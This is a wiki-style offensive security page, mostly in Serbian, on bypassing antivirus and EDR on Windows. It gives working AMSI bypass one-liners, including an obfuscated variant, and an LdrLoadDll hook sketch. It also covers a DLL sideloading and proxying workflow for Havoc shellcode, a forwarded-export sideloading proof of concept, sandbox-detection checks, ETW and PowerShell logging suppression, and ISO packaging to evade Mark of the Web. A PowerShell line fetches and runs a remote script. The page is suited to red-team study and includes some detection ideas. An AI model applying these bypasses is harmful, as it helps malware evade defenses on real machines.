# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavljanje Defender-a

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje Windows Defender-a.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za zaustavljanje Windows Defender-a lažiranjem drugog AV-a.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Trenutno, AVs koriste različite metode da provere da li je fajl maliciozan ili ne: static detection, dynamic analysis, i za naprednije EDRs, behavioural analysis.

### **Static detection**

Static detection se postiže označavanjem poznatih malicioznih stringova ili nizova bajtova u binarnom fajlu ili skripti, kao i ekstrakcijom informacija iz samog fajla (npr. file description, company name, digital signatures, icon, checksum, itd.). To znači da korišćenje poznatih javnih alata može učiniti da budete lakše detektovani, jer su verovatno već analizirani i označeni kao maliciozni. Postoji nekoliko načina da se zaobiđe ova vrsta detekcije:

- **Encryption**

Ako enkriptujete binarni fajl, AV neće moći da detektuje vaš program, ali će vam trebati neki loader koji će dekriptovati i pokrenuti program u memoriji.

- **Obfuscation**

Ponekad je dovoljno promeniti neke stringove u vašem binarnom fajlu ili skripti da biste prošli pored AV-a, ali ovo može biti vremenski zahtevno u zavisnosti od toga šta pokušavate da obfuskujete.

- **Custom tooling**

Ako razvijete sopstvene alate, neće postojati poznati loši signaturi, ali to zahteva puno vremena i truda.

> [!TIP]
> Dobar način za proveru protiv Windows Defender static detection je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On praktično deli fajl na više segmenata i zatim traži od Defender-a da skenira svaki pojedinačno; na taj način vam može tačno reći koji su stringovi ili bajtovi označeni u vašem binarnom fajlu.

Toplo preporučujem da pogledate ovu [YouTube playlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom AV Evasion.

### **Dynamic analysis**

Dynamic analysis je kada AV pokreće vaš binarni fajl u sandboxu i prati malicioznu aktivnost (npr. pokušaj dekriptovanja i čitanja lozinki iz browsera, pravljenje minidump-a na LSASS, itd.). Ovaj deo može biti malo komplikovaniji za zaobići, ali evo nekoliko stvari koje možete uraditi da izbegnete sandbokse.

- **Sleep before execution** U zavisnosti od implementacije, ovo može biti odličan način za zaobilaženje AV-ove dynamic analysis. AV-ovi imaju veoma malo vremena da skeniraju fajlove kako ne bi prekinuli korisnikov radni tok, pa korišćenje dugih sleep-ova može poremetiti analizu binarnih fajlova. Problem je što mnogi AV-ovi mogu jednostavno preskočiti sleep u sandboxu u zavisnosti od implementacije.
- **Checking machine's resources** Obično Sandboxes imaju vrlo malo resursa za rad (npr. < 2GB RAM), inače bi mogli usporiti korisnikov računar. Ovde možete biti vrlo kreativni, na primer proverom temperature CPU-a ili čak brzine ventilatora — nije sve implementirano u sandboxu.
- **Machine-specific checks** Ako želite da ciljate korisnika čija je radna stanica pridružena domenu "contoso.local", možete proveriti domen računara da vidite da li se poklapa sa onim koji ste naveli; ako se ne poklapa, možete napraviti da se program završi.

Ispostavilo se da je computername Microsoft Defender-ovog Sandbox-a HAL9TH, tako da možete proveriti ime računara u svom malveru pre detonacije — ako se ime poklapa sa HAL9TH, znači da ste unutar Defender-ovog sandboxa, pa vaš program može da izađe.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još neki veoma dobri saveti od [@mgeeky](https://twitter.com/mariuszbit) za borbu protiv Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanal</p></figcaption></figure>

Kao što smo već rekli u ovom postu, public tools će na kraju biti detektovani, pa biste trebali da se zapitate nešto:

Na primer, ako želite da dump-ujete LSASS, da li zaista morate da koristite mimikatz? Ili biste mogli koristiti neki drugi projekat koji je manje poznat, a takođe dump-uje LSASS?

Pravi odgovor je verovatno potonji. Uzimajući mimikatz kao primer, verovatno je jedan od, ako ne i najviše označenih komada malvera od strane AV-ova i EDR-ova; dok je sam projekat super kul, takođe je noćna mora raditi sa njim da biste zaobišli AV, pa samo tražite alternative za ono što pokušavate da postignete.

> [!TIP]
> Kada modifikujete svoje payload-e radi evazije, obavezno isključite automatsko slanje uzoraka (automatic sample submission) u defender-u, i molim vas, ozbiljno, DO NOT UPLOAD TO VIRUSTOTAL ako vam je cilj dugoročna evazija. Ako želite da proverite da li vaš payload detektuje određeni AV, instalirajte ga na VM, pokušajte da isključite automatsko slanje uzoraka i testirajte tamo dok ne budete zadovoljni rezultatima.

## EXEs vs DLLs

Kad god je moguće, uvek prioritizujte korišćenje DLLs za evaziju — po mom iskustvu, DLL fajlovi su obično mnogo manje detektovani i analizirani, pa je to vrlo jednostavan trik koji možete koristiti da izbegnete detekciju u nekim slučajevima (naravno, ako vaš payload ima način da se pokrene kao DLL).

Kao što vidimo na ovoj slici, DLL Payload iz Havoc-a ima stopu detekcije 4/26 na antiscan.me, dok EXE payload ima stopu detekcije 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me poređenje normalnog Havoc EXE payload-a vs normalnog Havoc DLL</p></figcaption></figure>

Sada ćemo pokazati neke trikove koje možete koristiti sa DLL fajlovima da budete mnogo diskretniji.

## DLL Sideloading & Proxying

**DLL Sideloading** iskorišćava DLL search order koji koristi loader tako što postavi i victim application i malicious payload(s) jedan pored drugog.

Možete proveriti programe podložne DLL Sideloading koristeći [Siofra](https://github.com/Cybereason/siofra) i sledeći powershell skript:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ova komanda će ispisati listu programa podložnih DLL hijacking-u unutar "C:\Program Files\\" i DLL fajlova koje pokušavaju da učitaju.

Toplo preporučujem da sami istražite **DLL Hijackable/Sideloadable programs**, ova tehnika može biti prilično stealthy ako se pravilno primeni, ali ako koristite javno poznate DLL Sideloadable programe, lako možete biti otkriveni.

Samo postavljanje zlonamernog DLL-a sa imenom koje program očekuje da učita neće automatski pokrenuti vaš payload, jer program očekuje određene funkcije u tom DLL-u; da bismo rešili ovaj problem, koristićemo drugu tehniku nazvanu **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program pravi iz proxy (i zlonamernog) DLL-a ka originalnom DLL-u, čime se očuvava funkcionalnost programa i omogućava izvršenje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autora [@flangvik](https://twitter.com/Flangvik/)

Ovo su koraci koje sam pratio:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Poslednja komanda će nam dati 2 fajla: šablon izvornog koda DLL, i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Ovo su rezultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! To bih nazvao uspehom.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ja **toplo preporučujem** da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading i takođe [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) da biste saznali više o onome što smo detaljnije razmatrali.

### Zloupotreba Forwarded Exports (ForwardSideLoading)

Windows PE modules mogu eksportovati funkcije koje su zapravo "forwarders": umesto da upućuju na kod, entry za export sadrži ASCII string oblika `TargetDll.TargetFunc`. Kada pozivalac resolvuje export, Windows loader će:

- Učitaj `TargetDll` ako nije već učitan
- Rešava `TargetFunc` iz njega

Ključna ponašanja koja treba razumeti:
- Ako je `TargetDll` KnownDLL, isporučuje se iz zaštićenog KnownDLLs namespace-a (npr., ntdll, kernelbase, ole32).
- Ako `TargetDll` nije KnownDLL, koristi se uobičajeni poredak pretrage DLL-ova, koji uključuje direktorijum modula koji vrši rezoluciju prosleđivanja.

Ovo omogućava indirektnu sideloading primitive: pronađite signed DLL koji eksportuje funkciju forward-ovanu na ime modula koji nije KnownDLL, zatim smestite taj signed DLL zajedno sa attacker-controlled DLL-om tačno nazvanim kao forwarded target module. Kada se forwarded export pozove, loader rezoluje forward i učitava vaš DLL iz istog direktorijuma, izvršavajući vašu DllMain.

Primer uočen na Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nije KnownDLL, tako da se rešava kroz uobičajeni redosled pretrage.

PoC (kopiraj-zalepi):
1) Kopiraj potpisani sistemski DLL u direktorijum u koji se može pisati
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite zlonamerni `NCRYPTPROV.dll` u isti folder. Minimalan `DllMain` je dovoljan za izvršavanje koda; nije potrebno implementirati preusmerenu funkciju da bi se pokrenuo `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Pokrenite prosleđivanje potpisanim LOLBinom:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Uočeno ponašanje:
- rundll32 (signed) učitava side-by-side `keyiso.dll` (signed)
- Dok razrešava `KeyIsoSetAuditingInterface`, loader prati forward ka `NCRYPTPROV.SetAuditingInterface`
- Zatim loader učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementirana, dobićete grešku "missing API" tek nakon što je `DllMain` već izvršen

Saveti za otkrivanje:
- Fokusirajte se na forwarded exports gde ciljni modul nije KnownDLL. KnownDLLs su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Možete izlistati forwarded exports pomoću alata kao što su:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte inventar forwardera za Windows 11 da biste potražili kandidate: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Pratite LOLBins (e.g., rundll32.exe) koji učitavaju signed DLLs iz ne-sistemskih putanja, a zatim iz tog direktorijuma učitavaju non-KnownDLLs sa istim osnovnim imenom
- Generišite upozorenje za lance procesa/modula kao što su: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` u putanjama zapisivim od strane korisnika
- Sprovodite politike integriteta koda (WDAC/AppLocker) i onemogućite write+execute u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Možete koristiti Freeze da učitate i izvršite svoj shellcode na prikriven način.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je samo igra mačke i miša — ono što danas radi može biti detektovano sutra, zato se nikada ne oslanjaj samo na jedan alat; ako je moguće, pokušaj da povežeš više evasion techniques.

## AMSI (Anti-Malware Scan Interface)

AMSI je napravljen da spreči "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". U početku su AVs bili sposobni samo da skeniraju **fajlove na disku**, pa ako si nekako uspeo da izvršiš payload direktno u memoriji, AV nije imao načina da to zaustavi jer nije imao dovoljno uvida.

AMSI funkcija je integrisana u sledeće komponente Windows-a.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Omogućava antivirus rešenjima da inspektuju ponašanje skripti izlažući sadržaj skripte u obliku koji nije enkriptovan ni obfuskovan.

Pokretanje `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` će proizvesti sledeći alert na Windows Defender-u.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Primećuješ kako dodaje `amsi:` na početak, a zatim putanju do izvršnog fajla iz kojeg je skripta pokrenuta — u ovom slučaju, powershell.exe

Nismo ispustili nijedan fajl na disk, ali smo ipak uhvaćeni u memoriji zbog AMSI.

Štaviše, počevši od **.NET 4.8**, C# kod takođe prolazi kroz AMSI. Ovo čak utiče i na `Assembly.Load(byte[])` za učitavanje izvršavanja u memoriji. Zato se preporučuje korišćenje nižih verzija .NET-a (kao što su 4.7.2 ili niže) za in-memory execution ako želiš da zaobiđeš AMSI.

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuscation**

Pošto AMSI uglavnom radi sa static detections, modifikovanje skripti koje pokušavaš da učitaš može biti dobar način da izbegneš detekciju.

Međutim, AMSI ima sposobnost da deobfuskuje skripte čak i ako imaju više slojeva, tako da obfuscation može biti loša opcija u zavisnosti od načina na koji je urađena. To je razlog zašto nije tako jednostavno za zaobići. Ipak, ponekad je dovoljno da promeniš nekoliko imena promenljivih i bićeš dobar, tako da zavisi od toga koliko je nešto označeno.

- **AMSI Bypass**

Pošto je AMSI implementiran učitavanjem DLL-a u powershell (takođe cscript.exe, wscript.exe, itd.) proces, moguće je lako manipulisati njime čak i kada se radi kao neprivilegovani korisnik. Zbog ovog nedostatka u implementaciji AMSI, istraživači su pronašli više načina da izbegnu AMSI scanning.

**Forcing an Error**

Prinuditi AMSI inicijalizaciju da zakaže (amsiInitFailed) će rezultirati time da se skeniranje neće pokrenuti za trenutni proces. Ovo je prvobitno otkrio [Matt Graeber](https://twitter.com/mattifestation), a Microsoft je razvio signature da spreči širu upotrebu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Bila je potrebna samo jedna linija powershell koda da učini AMSI neupotrebljivim za trenutni powershell proces. Naravno, ova linija je označena od strane samog AMSI‑ja, tako da je potrebna neka modifikacija da bi se ova tehnika mogla koristiti.

Evo izmenjenog AMSI bypassa koji sam uzeo sa ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Ovu tehniku je inicijalno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/) i ona podrazumeva pronalaženje adrese funkcije "AmsiScanBuffer" u amsi.dll (odgovorne za skeniranje korisnički unetog sadržaja) i njeno prepisivanje instrukcijama koje vraćaju kod E_INVALIDARG; na taj način rezultat stvarnog skeniranja vraća 0, što se tumači kao čist rezultat.

> [!TIP]
> Pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što je `amsi.dll` učitan u trenutni proces. Robusno, nezavisno od jezika rešenje za zaobilaženje je postavljanje user‑mode hook‑a na `ntdll!LdrLoadDll` koji vraća grešku kada je traženi modul `amsi.dll`. Kao rezultat, AMSI se nikada ne učitava i ne vrše se skeniranja za taj proces.

Nacrt implementacije (x64 C/C++ pseudokod):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Napomene
- Radi na PowerShell, WScript/CScript i custom loaders alike (anything that would otherwise load AMSI).
- Koristiti uz slanje skripti preko stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da bi se izbegli dugi artefakti komandne linije.
- Primećeno korišćenje kod loaders koji se izvršavaju kroz LOLBins (npr. `regsvr32` koji poziva `DllRegisterServer`).

Ovaj alat [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) takođe generiše skriptu za zaobilaženje AMSI.

**Ukloni otkriveni potpis**

Možete koristiti alat kao što je **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da uklonite otkriveni AMSI potpis iz memorije trenutnog procesa. Ovaj alat radi tako što skenira memoriju trenutnog procesa tražeći AMSI potpis, a zatim ga prepisuje NOP instrukcijama, efikasno uklanjajući ga iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

Listu AV/EDR proizvoda koji koriste AMSI možete pronaći u **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Koristite PowerShell verziju 2**
Ako koristite PowerShell verziju 2, AMSI neće biti učitan, pa možete pokretati svoje skripte bez skeniranja od strane AMSI. Možete to uraditi ovako:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging je funkcija koja vam omogućava da zabeležite sve PowerShell komande izvršene na sistemu. To može biti korisno za auditing i rešavanje problema, ali takođe može predstavljati **problem za napadače koji žele da izbegnu detekciju**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Disable PowerShell Transcription and Module Logging**: Možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) za ovu svrhu.
- **Use Powershell version 2**: Ako koristite PowerShell verziju 2, AMSI se neće učitati, tako da možete pokretati svoje skripte bez skeniranja od strane AMSI. Možete to uraditi: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Koristite [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da spawn-ujete powershell bez odbrana (ovo je ono što `powerpick` from Cobal Strike koristi).


## Obfuscation

> [!TIP]
> Nekoliko tehnika obfuscation se oslanja na enkripciju podataka, što će povećati entropiju binarnog fajla i olakšati AV-ovima i EDR-ima da ga detektuju. Budite oprezni s tim i razmislite da enkripciju primenite samo na specifične delove koda koji su osetljivi ili koje trebate sakriti.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes. The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`). This also patches the PE checksum so any modification will crash the binary. Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that can be useful when building your own unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation. Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload. Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork [LLVM](http://www.llvm.org/) kompajlacionog paketa sposoban da poveća bezbednost softvera kroz [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstrira kako koristiti `C++11/14` jezik da bi se pri kompajliranju generisao obfuscated code bez upotrebe bilo kog eksternog alata i bez menjanja kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuscated operations generisanih od strane C++ template metaprogramming framework-a, što će otežati život osobi koja želi da crack the application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može da obfuscate različite pe fajlove uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za proizvoljne executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je fine-grained code obfuscation framework za LLVM-supported languages koji koristi ROP (return-oriented programming). ROPfuscator obfuscates program na nivou assembly koda tako što transformiše regular instructions u ROP chains, potkopavajući naše prirodno poimanje normalnog control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeće EXE/DLL u shellcode i potom ih učita

## SmartScreen & MoTW

Možda ste videli ovaj ekran prilikom skidanja nekih izvršnih fajlova sa interneta i njihovog pokretanja.

Microsoft Defender SmartScreen je sigurnosni mehanizam namenjen da zaštiti krajnjeg korisnika od pokretanja potencijalno malicioznih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom funkcioniše na bazi reputacije, što znači da će aplikacije koje se retko preuzimaju pokrenuti SmartScreen i tako upozoriti i sprečiti krajnjeg korisnika da izvrši fajl (iako fajl i dalje može biti izvršen klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) sa imenom Zone.Identifier koji se automatski kreira prilikom preuzimanja fajlova sa interneta, zajedno sa URL-om sa kojeg je fajl preuzet.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS za fajl preuzet sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršni fajlovi potpisani sa **trusted** signing certificate **won't trigger SmartScreen**.

Vrlo efikasan način da sprečite da vaši payloads dobiju Mark of The Web je da ih spakujete unutar nekog kontejnera kao što je ISO. To se dešava zato što Mark-of-the-Web (MOTW) **cannot** biti primenjen na **non NTFS** volumene.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakira payloads u izlazne kontejnere kako bi izbegao Mark-of-the-Web.

Primer korišćenja:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za logovanje u Windows-u koji omogućava aplikacijama i sistemskim komponentama da **log events**. Međutim, može se koristiti i od strane security proizvoda za nadgledanje i detekciju malicioznih aktivnosti.

Slično kao što se AMSI onemogućava (bypassa), moguće je i da funkcija **`EtwEventWrite`** korisničkog procesa vrati odmah bez logovanja događaja. Ovo se postiže patchovanjem funkcije u memoriji da odmah return-uje, efektivno onemogućavajući ETW logging za taj proces.

Više informacija možete naći u **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries in memory je poznato već duže vreme i i dalje je odličan način za pokretanje post-exploitation alata bez hvatanja od strane AV.

Pošto će payload biti učitan direktno u memoriju bez pisanja na disk, moramo se samo pozabaviti patchovanjem AMSI za ceo proces.

Većina C2 framework-a (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) već omogućava izvršavanje C# assemblies direktno u memoriji, ali postoje različiti načini da se to uradi:

- **Fork\&Run**

Ovo podrazumeva **pokretanje novog žrtvovanog procesa**, injektovanje vašeg post-exploitation malicioznog koda u taj novi proces, izvršenje koda i nakon završetka ubijanje novog procesa. Ovo ima i prednosti i mane. Prednost fork and run metode je što izvršenje nastaje **van** našeg Beacon implant process-a. To znači da ako nešto pođe naopako ili bude otkriveno, postoji **mnogo veća šansa** da će naš **implant preživeti.** Mana je što imate **veću šansu** da budete uhvaćeni od strane **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Radi se o injektovanju post-exploitation malicioznog koda **u sopstveni proces**. Na ovaj način možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV, ali mana je što ako nešto pođe po zlu pri izvršavanju vašeg payload-a, postoji **mnogo veća šansa** da ćete **izgubiti svoj beacon** jer proces može da se sruši.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
